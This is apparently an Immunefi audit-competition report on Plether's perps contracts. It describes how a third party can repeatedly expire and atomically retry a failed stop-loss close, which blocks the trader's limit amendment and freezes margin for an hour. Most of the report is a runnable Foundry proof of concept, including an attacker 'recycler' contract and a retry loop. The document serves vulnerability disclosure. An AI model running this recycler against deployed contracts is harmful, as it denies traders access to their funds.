# \#98750 [SC-High] Atomic public protection retries block EOA owner amendments and freeze margin for over an hour

**Submitted on Nov 10th 2026 at 01:25:49 UTC by @dxhod for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98750
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

A third party can keep an EOA trader's failed protected stop-loss close pending by atomically expiring and retrying its child order at every deadline. This prevents the trader from amending the retained close limit that caused the failure. In the exact-release Foundry PoC, 60 renewals over 3,660 simulated seconds keep 1,985.500001 USDG of position margin unavailable. The attack requires the third party to win the relevant ordering opportunities; no theft is claimed.

## Vulnerability Details

When a protected close violates the trader's maximum close notional, the close fails and `PositionProtectionBook` relatches the protection. `amendLatchedPositionProtectionCloseLimits` permits the owner to change that limit only while the protection is `Latched` and no child order is pending. `retryPositionProtectionClose` is permissionless, and `OrderRouter.expireOrder` is also callable by anyone after the child order's strict execution deadline.

An unrelated caller can combine `expireOrder` and `retryPositionProtectionClose` in one transaction. The protection is briefly `Latched` between those calls, but no other transaction can execute in that interval. A normal EOA trader cannot use a helper contract for an atomic owner amendment because the Book checks `msg.sender`. If the caller renews the still-failing child at each deadline, the trader's amendment attempt encounters a pending order and an ordinary close commitment remains blocked by active protection.

This differs from Cecuro MED-9: that finding concerned retries without trader financial caps and an economically unbounded forced close. Here the cap is enforced; the new liveness failure is that the public atomic retry removes the EOA owner's documented amendment route. `SECURITY.md` describes permissionless retries, but not this atomic starvation of the amendment lane. We recognize the program may nevertheless classify the root as already disclosed.

## Impact Details

The PoC uses the pinned release's production Router, six-feed oracle configuration and risk parameters, 1 USDG seeds, and an ordinary assumed 1M USDG Junior LP deposit for market depth. A 10,000 USDG LONG has a 10,050 USDG maximum close notional. After a 1% basket rise, the protected close fails that bound. Sixty separate atomic expiry/retry calls over 3,660 simulated seconds keep the position open and 1,985.500001 USDG of its margin locked. A fresh-mark withdrawal of free balance plus one atom reverts with `MarginClearinghouse__InsufficientFreeEquity`; the owner can close and withdraw after recycling stops.

This demonstrates the listed Medium impact, temporary freezing of funds for at least one hour, under the stated transaction order. The PoC does not establish a guaranteed 60-boundary priority win on Arbitrum One or actual L2 attack cost. A contract-account owner that wins a boundary can batch expiry and amendment; the affected path shown is an EOA trader.

## References

- Pinned source: [owner amendment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L329) and [public retry](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405).
- Permissionless expiry: [Router entry point](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191-L197) and [strict expiry check](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L49-L58).
- Prior audit: [Cecuro AI audit, MED-9](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf).
- [Competition scope and PoC rule](https://immunefi.com/audit-competition/plether/scope/).


## Proof of Concept

## Proof of Concept

This runnable Foundry test targets the exact competition commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` without changing any in-scope contract. It uses the production `OrderRouter`, six launch basket feeds, published release settings and 1 USDG tranche seeds. Only the out-of-scope USDG token and Pyth update provider are mocked. The test passed 1/1 in the original checkout and 1/1 in an independent clean checkout with pinned submodules. The source below has SHA-256 `3DCAE52FE34E102C004A41FE7E9AD5B8599560A1DFBF6C8877ECEB110DD03074`.

1. Clone the competition repository with submodules and check out the pinned commit. Run `git submodule update --init --recursive` after checkout.
2. Save the complete Solidity source below as `packages/perps/test/sca/OC-01-release.t.sol`.
3. From `packages/perps`, run `forge test --match-path test/sca/OC-01-release.t.sol --match-test test_releaseRouterSixFeedAtomicRetryOverOneHour --out out-sca-oc01-release --cache-path cache-sca-oc01-release -vv`.
4. Observe that the protected close fails the owner's 10,050 USDG cap after a 1% basket rise, then 60 public atomic expiry/retry calls over 3,660 simulated seconds deny owner amendment and ordinary close. The owner's fresh-mark withdrawal of free assets plus one atom reverts with `MarginClearinghouse__InsufficientFreeEquity` while 1,985.500001 USDG position margin remains locked. Owner recovery succeeds once the third party stops.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {LegacyOrderRouterHarness} from "../utils/LegacyOrderRouterHarness.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouter} from "@plether/perps/interfaces/IOrderRouter.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {CfdEngineProtocolLens} from "@plether/perps/CfdEngineProtocolLens.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEngineAccountLens} from "@plether/perps/CfdEngineAccountLens.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {MockSettlementToken} from "../utils/MockSettlementToken.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";

/// @dev The two public calls share one EVM transaction. No owner transaction can land between them.
contract OC01AtomicPublicRecycler {
    function recycle(IOrderRouter releaseRouter, IPositionProtectionActions book, uint64 attempt, uint64 protection)
        external returns (uint64 next)
    {
        OrderV3Types.ExecutionResult memory expired = releaseRouter.expireOrder(attempt);
        require(expired.terminalReason == OrderV3Types.TerminalReason.Expired, "attempt did not expire");
        next = book.retryPositionProtectionClose(protection);
    }
}

contract OC01ReleaseProof is BasePerpTest {
    address constant OWNER = address(0xA11CE);
    address constant ATTACKER = address(0xB0B);
    uint256 constant SIZE = 10_000e18;
    uint256 constant OPEN_PRICE = 100_000_000;
    uint256 constant STOP_PRICE = 100_800_000;

    OrderRouter releaseRouter;
    IPositionProtectionActions book;
    IPositionProtectionViews bookView;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function setUp() public override {
        settlementToken = new MockSettlementToken();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        terminalNavBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalNavBook));
        engineAccountLens = new CfdEngineAccountLens(address(engine));
        engineLens = new CfdEngineLens(address(engine));
        engineProtocolLens = new CfdEngineProtocolLens(address(engine));
        housePoolRedemptionMathSidecar = new HousePoolRedemptionMathSidecar();
        pool = new HousePool(address(settlementToken), address(engine), address(housePoolRedemptionMathSidecar));
        baseMockPyth = new MockPyth();
        baseMockPyth.setSynchronizeLegacyUniquePrices(true);
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));
        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), _feedIds(), _weights(), _bases(), _inversions()
        );
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, address(engine), address(clearinghouse), address(pool));
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        releaseRouter = new OrderRouter(
            address(engine), address(engineLens), address(pool), address(pletherOracle), address(keeperSidecar),
            address(policyEvaluator), address(orderExecutionSidecar), address(lifecycleBook)
        );
        assertEq(address(releaseRouter), predictedRouter);
        // BasePerpTest's LP helper only uses this typed pointer for the authorized Router address.
        // Runtime code at this address is the production OrderRouter deployed above.
        router = LegacyOrderRouterHarness(payable(address(releaseRouter)));
        routerAdmin = OrderRouterAdmin(releaseRouter.admin());
        engine.setOrderRouter(address(releaseRouter));
        clearinghouse.setEngine(address(engine));
        IHousePool.PoolConfig memory poolCfg = _currentPoolConfig();
        poolCfg.maxSeniorExposureAssets = 40_000_000e6;
        poolCfg.maxSeniorShareBps = 8_000;
        pool.proposePoolConfig(poolCfg);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        vm.warp(SETUP_TIMESTAMP);
        settlementToken.mint(address(this), 2e6);
        settlementToken.approve(address(pool), 2e6);
        pool.initializeSeedPosition(false, 1e6, address(this));
        pool.initializeSeedPosition(true, 1e6, address(this));
        pool.activateTrading();
        _fundJunior(address(this), 1_000_000e6);

        IOrderRouterAdminHost.RouterConfig memory cfg = _releaseRouterConfig();
        cfg.minOpenNotionalAssets = 1_000e6;
        _setRouterConfig(cfg);
        assertEq(releaseRouter.minOpenNotionalAssets(), 1_000e6);
        assertEq(engine.settlementBufferBps(), 25);
        assertEq(releaseRouter.maxExecutionWindowSeconds(), 60);
        book = IPositionProtectionActions(address(releaseRouter.positionProtectionBook()));
        bookView = IPositionProtectionViews(address(releaseRouter.positionProtectionBook()));
        _fundTrader(OWNER, 20_000e6);
        if (block.timestamp <= engine.lastMarkTime()) vm.warp(uint256(engine.lastMarkTime()) + 1);
        releaseRouter.updateMarkPrice(_releasePriceData(OPEN_PRICE));
    }

    function test_releaseRouterSixFeedAtomicRetryOverOneHour() public {
        // This is a caller-authored V3 request, not BasePerpTest._open or the test-only scalar adapter.
        OrderV3Types.OrderRequest memory request = _openRequest();
        vm.prank(OWNER);
        uint64 openId = releaseRouter.commitOrder(request);
        vm.prank(ATTACKER);
        OrderV3Types.ExecutionResult memory opened = releaseRouter.executeOrder(openId, _releaseExecutionData(OPEN_PRICE));
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public open executed");
        (uint256 initialSize,,,,,,) = engine.positions(OWNER);
        assertEq(initialSize, SIZE);

        // Historical order execution advances the Engine mark without installing a current accepted basket.
        // Publish and install the next live basket before creating protection.
        _releaseExecutionData(OPEN_PRICE);
        releaseRouter.updateMarkPrice(_releasePriceData(OPEN_PRICE));

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_PRICE;
        params.closeLimits = _limits(10_050e6);
        vm.prank(OWNER);
        uint64 protection = book.createPositionProtection(params);
        assertEq(SIZE * OPEN_PRICE / 1e20, 10_000e6);
        assertEq(SIZE * STOP_PRICE / 1e20, 10_080e6);

        vm.warp(vm.getBlockTimestamp() + 3600);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(ATTACKER);
        uint64 initialAttempt = book.triggerPositionProtection(protection, _releasePriceData(STOP_PRICE));
        emit log_named_uint("six_feed_basket_price_after_trigger", pletherOracle.getLatestPrice());
        vm.prank(ATTACKER);
        OrderV3Types.ExecutionResult memory failed = releaseRouter.executeOrder(initialAttempt, _releaseExecutionData(STOP_PRICE));
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        _assertStatus(protection, PositionProtectionTypes.PositionProtectionStatus.Latched);

        vm.prank(ATTACKER);
        uint64 attempt = book.retryPositionProtectionClose(protection);
        OC01AtomicPublicRecycler recycler = new OC01AtomicPublicRecycler();
        uint256 start = vm.getBlockTimestamp();
        for (uint256 i; i < 60; ++i) {
            uint64 deadline = releaseRouter.lifecycleBook().orderTiming(attempt).executionDeadline;
            assertEq(uint256(deadline) - vm.getBlockTimestamp(), 60, "fresh retry window");
            _assertOwnerBlocked(protection);
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            attempt = recycler.recycle(IOrderRouter(address(releaseRouter)), book, attempt, protection);
            _assertStatus(protection, PositionProtectionTypes.PositionProtectionStatus.Triggered);
            assertEq(releaseRouter.pendingOrderCounts(OWNER), 1);
        }
        assertEq(vm.getBlockTimestamp() - start, 3660);
        (uint256 blockedSize, uint256 blockedMargin,,,,,) = engine.positions(OWNER);
        assertEq(blockedSize, SIZE);
        assertGt(blockedMargin, 0, "position margin remains locked during retry loop");
        assertFalse(
            engineLens.isLiquidatableAt(OWNER, STOP_PRICE, pool.totalAssets()),
            "position remains safe at the stop-loss price"
        );
        emit log_named_uint("elapsed_seconds_under_atomic_recycling", vm.getBlockTimestamp() - start);
        emit log_named_uint("atomic_recycle_transactions", 60);
        emit log_named_uint("open_position_size_after_recycles", blockedSize);
        emit log_named_uint("position_margin_assets_after_recycles", blockedMargin);
        // Refresh the accepted mark so withdrawal tests the clearinghouse lock, not mark staleness.
        releaseRouter.updateMarkPrice(_releasePriceData(STOP_PRICE));
        vm.prank(OWNER);
        clearinghouse.withdrawMargin(1);
        uint256 freeDuringRetry = clearinghouse.getFreeBuyingPowerAssets(OWNER);
        uint256 balanceDuringRetry = clearinghouse.balanceAssets(OWNER);
        uint256 walletDuringRetry = settlementToken.balanceOf(OWNER);
        assertGt(freeDuringRetry, 0, "free surplus remains withdrawable");
        assertGt(balanceDuringRetry - freeDuringRetry, 0, "position margin remains locked");
        vm.prank(OWNER);
        vm.expectRevert(MarginClearinghouse.MarginClearinghouse__InsufficientFreeEquity.selector);
        clearinghouse.withdrawMargin(freeDuringRetry + 1);
        assertEq(clearinghouse.balanceAssets(OWNER), balanceDuringRetry, "failed lock withdrawal rolls back");
        assertEq(settlementToken.balanceOf(OWNER), walletDuringRetry, "failed lock withdrawal pays nothing");
        emit log_named_uint("clearinghouse_balance_during_retries", balanceDuringRetry);
        emit log_named_uint("free_settlement_during_retries", freeDuringRetry);

        // If the attacker ceases recycling, the owner can expire the pending attempt, amend, and exit.
        uint64 lastDeadline = releaseRouter.lifecycleBook().orderTiming(attempt).executionDeadline;
        vm.warp(uint256(lastDeadline) + 1);
        vm.prank(OWNER);
        releaseRouter.expireOrder(attempt);
        _assertStatus(protection, PositionProtectionTypes.PositionProtectionStatus.Latched);
        vm.prank(OWNER);
        book.amendLatchedPositionProtectionCloseLimits(protection, _limits(20_000e6));
        vm.prank(OWNER);
        uint64 recovery = book.retryPositionProtectionClose(protection);
        vm.prank(OWNER);
        OrderV3Types.ExecutionResult memory exited = releaseRouter.executeOrder(recovery, _releaseExecutionData(STOP_PRICE));
        assertEq(uint8(exited.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 finalSize,,,,,,) = engine.positions(OWNER);
        assertEq(finalSize, 0);
        emit log_named_uint("remaining_position_size_after_owner_recovery", finalSize);
        uint256 balanceAfterClose = clearinghouse.balanceAssets(OWNER);
        vm.prank(OWNER);
        clearinghouse.withdrawMargin(balanceAfterClose);
        assertEq(clearinghouse.balanceAssets(OWNER), 0, "owner can withdraw after closing");
        emit log_named_uint("withdrawn_after_owner_recovery", balanceAfterClose);
    }

    function _assertOwnerBlocked(uint64 protection) private {
        OrderV3Types.OrderRequest memory closeRequest = _closeRequest();
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(protection, _limits(20_000e6));
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        releaseRouter.commitOrder(closeRequest);
    }

    function _assertStatus(uint64 id, PositionProtectionTypes.PositionProtectionStatus expected) private view {
        assertEq(uint8(bookView.getPositionProtection(id).status), uint8(expected));
    }

    function _openRequest() private view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256("OC-01-public-open");
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = SIZE;
        r.marginDelta = 2_000e6;
        r.targetPrice = 1;
        r.bounds = _bounds();
    }

    function _closeRequest() private view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("OC-01-public-close", block.timestamp));
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = SIZE;
        r.targetPrice = type(uint256).max;
        r.isClose = true;
        r.bounds = _bounds();
    }

    function _bounds() private view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(block.timestamp + 60);
        b.executionWindowSeconds = 60;
        b.allowedExecutionModes = 7;
        b.expectedConfigHash = releaseRouter.lifecycleBook().currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.maxPostLeverageBps = type(uint32).max;
    }

    function _limits(uint256 maxNotional)
        private pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits)
    {
        limits.maxExecutionNotionalAssets = maxNotional;
        limits.maxGrossAccountDebitAssets = type(uint256).max;
        limits.maxActionChargeAssets = type(uint256).max;
        limits.maxExplicitFeesAssets = type(uint256).max;
    }

    function _feedIds() private pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _weights() private pure returns (uint256[] memory x) {
        x = new uint256[](6);
        x[0] = 576e15; x[1] = 136e15; x[2] = 119e15;
        x[3] = 91e15; x[4] = 42e15; x[5] = 36e15;
    }

    function _bases() private pure returns (uint256[] memory x) {
        x = new uint256[](6);
        x[0] = 117_500_000; x[1] = 638_000; x[2] = 134_480_000;
        x[3] = 72_880_000; x[4] = 10_860_000; x[5] = 126_100_000;
    }

    function _inversions() private pure returns (bool[] memory x) {
        x = new bool[](6);
        x[1] = true; x[3] = true; x[4] = true; x[5] = true;
    }

    function _releaseRouterConfig() private view returns (IOrderRouterAdminHost.RouterConfig memory config) {
        config.maxExecutionWindowSeconds = releaseRouter.maxExecutionWindowSeconds();
        config.orderExecutionStalenessLimit = releaseRouter.pletherOracle().orderExecutionStalenessLimit();
        config.liquidationStalenessLimit = releaseRouter.pletherOracle().liquidationStalenessLimit();
        config.basketMaxConfidenceRatioBps = releaseRouter.pletherOracle().basketMaxConfidenceRatioBps();
        config.orderSettlementWindow = releaseRouter.pletherOracle().orderSettlementWindow();
        config.maxComponentPublishTimeDivergence = releaseRouter.pletherOracle().maxComponentPublishTimeDivergence();
        config.adverseConfidenceMultiplierBps = releaseRouter.pletherOracle().adverseConfidenceMultiplierBps();
        config.minOpenNotionalAssets = releaseRouter.minOpenNotionalAssets();
        config.openOrderExecutionBountyBps = releaseRouter.openOrderExecutionBountyBps();
        config.minOpenOrderExecutionBountyAssets = releaseRouter.minOpenOrderExecutionBountyAssets();
        config.maxOpenOrderExecutionBountyAssets = releaseRouter.maxOpenOrderExecutionBountyAssets();
        config.positionProtectionTriggerBountyAssets = releaseRouter.positionProtectionTriggerBountyAssets();
        config.maxPendingOrders = releaseRouter.maxPendingOrders();
        config.minEngineGas = releaseRouter.minEngineGas();
        config.maxPruneOrdersPerCall = releaseRouter.maxPruneOrdersPerCall();
    }

    function _rawPrice(uint256 i, bool moved) private pure returns (int64) {
        uint256 base = _bases()[i];
        bool inverse = _inversions()[i];
        uint256 raw = inverse ? 1e16 / base : base;
        if (moved) raw = inverse ? raw * 100 / 101 : raw * 101 / 100;
        return int64(uint64(raw));
    }

    function _releasePriceData(uint256 indexPrice) private view returns (bytes[] memory data) {
        bool moved = indexPrice == STOP_PRICE;
        bytes32[] memory ids = _feedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](6);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < 6; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(_rawPrice(i, moved), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _releaseExecutionData(uint256 indexPrice) private returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bool moved = indexPrice == STOP_PRICE;
        bytes32[] memory ids = _feedIds();
        uint256 publishTime = vm.getBlockTimestamp();
        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setUniquePrice(ids[i], _rawPrice(i, moved), 0, -8, publishTime, publishTime - 1);
        }
        data = new bytes[](1);
    }
}
```

